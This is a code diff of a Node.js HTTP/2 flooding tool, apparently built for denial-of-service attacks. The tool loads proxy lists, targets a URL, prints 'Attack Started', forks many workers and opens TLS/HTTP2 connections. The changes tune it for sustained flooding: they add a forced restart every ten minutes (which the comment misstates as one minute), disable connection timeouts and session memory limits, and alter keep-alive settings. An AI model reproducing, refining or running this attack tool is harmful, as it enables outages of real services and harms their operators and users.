@@ -1,3 +1,8 @@
+setInterval(() => {
+    console.log('Restarting the process...');
+    process.exit();
+}, 600000);  // 60,000 ms = 1 minute
+
 process.on('uncaughtException', function(er) {
     //console.log(er);
 });
@@ -391,7 +396,8 @@ function randomCharacters(length) {
             'gzip, deflate, br',
             'gzip, deflate',
             '*',
-        ]
+        ] 
+
     var proxies = readLines(args.proxy);
     const parsedTarget = url.parse(args.target);
 
@@ -403,7 +409,7 @@ function randomCharacters(length) {
         }
         console.log("Attack Started");
         console.log(`Timestamp: \x1b[37m${dateObj.toDateString()} ${dateObj.toTimeString()}`);
-        setTimeout(() => {}, process.argv[5] * 1000);
+        //setTimeout(() => {}, process.argv[5] * 1000);
         for (let counter = 1; counter <= args.threads; counter++) {
             cluster.fork();
         }
@@ -427,8 +433,8 @@ function randomCharacters(length) {
                 readable: true
             });
 
-            connection.setTimeout(options.timeout * 10000);
-            connection.setKeepAlive(true, 10000);
+            //connection.setTimeout(options.timeout * 10000);
+            connection.setKeepAlive(true, 0);
             connection.setNoDelay(true);
             connection.on("connect", () => {
                 connection.write(buffer);
@@ -537,7 +543,7 @@ function randomCharacters(length) {
                     maxHeaderListSize: 262144,
                     enablePush: false
                 },
-                maxSessionMemory: 64000,
+                //maxSessionMemory: 3333,
                 maxDeflateDynamicTableSize: 4294967295,
                 createConnection: () => tlsConn,
                 socket: connection,
@@ -583,3 +589,4 @@ function randomCharacters(length) {
             });
         });
     }
+    
